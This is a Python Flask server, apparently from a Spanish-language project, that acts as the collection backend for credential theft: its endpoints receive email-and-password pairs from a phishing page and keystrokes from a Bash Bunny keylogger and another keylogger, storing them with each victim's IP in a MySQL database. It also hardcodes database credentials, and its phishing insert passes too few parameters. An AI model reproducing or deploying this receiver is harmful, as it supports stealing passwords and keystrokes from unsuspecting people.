from flask import Flask, request, jsonify
import mysql.connector
from datetime import datetime

app = Flask(__name__)

# Configuración de MySQL
db_config = {
    "host": "db",  # Nombre del servicio en docker-compose
    "user": "sea",
    "password": "proyectose@",
    "database": "bd_keyloggers"
}

# Ruta para recibir datos del Phishing
@app.route('/guardar-web', methods=['POST'])
def guardar_web():
    data = request.json
    correo = data.get("correo")
    contrasena = data.get("contrasena")
    ip_cliente = request.remote_addr

    if not correo or not contrasena:
        return jsonify({"error": "Datos inválidos"}), 400

    try:
        conexion = mysql.connector.connect(**db_config)
        cursor = conexion.cursor()

        query = "INSERT INTO Phishing (fecha, ip, correo, contrasena) VALUES (NOW(), %s, %s, %s)"
        cursor.execute(query, (ip_cliente, f"{correo}:{contrasena}"))

        conexion.commit()
        cursor.close()
        conexion.close()

        return jsonify({"mensaje": "Datos guardados en Phishing"})
    
    except mysql.connector.Error as error:
        return jsonify({"error": f"Error en la base de datos: {error}"}), 500


# Ruta para recibir datos del keylogger Bash Bunny
@app.route('/guardar-bashbunny', methods=['POST'])
def guardar_bashbunny():
    data = request.json
    datos = data.get("datos")
    ip_cliente = request.remote_addr  # Capturar IP del usuario
    fecha = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    if not datos:
        return jsonify({"error": "Datos inválidos"}), 400

    try:
        conexion = mysql.connector.connect(**db_config)
        cursor = conexion.cursor()

        query = "INSERT INTO keylogger (fecha, ip, tecla, tipo) VALUES (%s, %s, %s, 'B')"
        cursor.execute(query, (fecha, ip_cliente, datos))

        conexion.commit()
        cursor.close()
        conexion.close()

        return jsonify({"mensaje": "Datos guardados en Keylogger (Bash Bunny)"})

    except mysql.connector.Error as error:
        return jsonify({"error": f"Error en la base de datos: {error}"}), 500


# Ruta para recibir datos del ilimitado
@app.route('/guardar-email', methods=['POST'])
def guardar_email():
    data = request.json
    datosI = data.get("datosI")
    ip_cliente = request.remote_addr  # Capturar IP del usuario

    if not datosI:
        return jsonify({"error": "Datos inválidos"}), 400

    try:
        conexion = mysql.connector.connect(**db_config)
        cursor = conexion.cursor()

        query = "INSERT INTO keylogger (fecha, ip, tecla, tipo) VALUES (NOW(), %s, %s, 'I')"
        cursor.execute(query, (ip_cliente, datosI))

        conexion.commit()
        cursor.close()
        conexion.close()

        return jsonify({"mensaje": "Datos guardados en Keylogger (Bash Bunny)"})

    except mysql.connector.Error as error:
        return jsonify({"error": f"Error en la base de datos: {error}"}), 500


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
